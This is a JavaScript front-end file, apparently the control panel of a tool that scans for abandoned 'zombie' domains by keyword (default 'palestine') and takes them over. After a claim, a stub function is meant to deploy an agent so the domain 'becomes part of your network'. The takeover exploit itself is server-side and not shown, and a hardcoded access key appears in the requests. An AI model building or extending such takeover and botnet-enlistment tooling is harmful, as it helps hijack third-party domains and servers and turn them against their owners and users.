// commander.js (update)

function scanZombie() {
    const keyword = document.getElementById('keyword').value || 'palestine';
    const resultsDiv = document.getElementById('zombie-results');
    resultsDiv.innerHTML = '🔍 Sedang memindai...';

    fetch('/api/zombie/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ keyword: keyword, key: 'watcher123' })
    })
    .then(r => r.json())
    .then(data => {
        if (data.length === 0) {
            resultsDiv.innerHTML = '<p>❌ Tidak ada zombie ditemukan.</p>';
            return;
        }
        resultsDiv.innerHTML = data.map(z => `
            <div class="zombie-item">
                <b>🧟 ${z.domain}</b> 
                <span class="status ${z.risk}">${z.status}</span><br>
                <small>Risiko: ${z.risk.toUpperCase()}</small><br>
                <button onclick="takeoverZombie('${z.domain}', '${z.action}')">
                    🚀 Ambil Alaih
                </button>
            </div>
        `).join('');
    })
    .catch(e => {
        resultsDiv.innerHTML = `<p>❌ Error: ${e.message}</p>`;
    });
}

function takeoverZombie(domain, action) {
    fetch('/api/zombie/takeover', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ domain, action, key: 'watcher123' })
    })
    .then(r => r.json())
    .then(data => {
        alert(data.message);
        if (data.status === 'claimed') {
            deployAgentTo(domain);
        }
    });
}

// Setelah ambil alih, kirim agent mini
function deployAgentTo(domain) {
    // Di dunia nyata: deploy agent ke server yang kamu kontrol
    alert(`✅ Agent mini dikirim ke ${domain} — sekarang jadi bagian jaringanmu!`);
}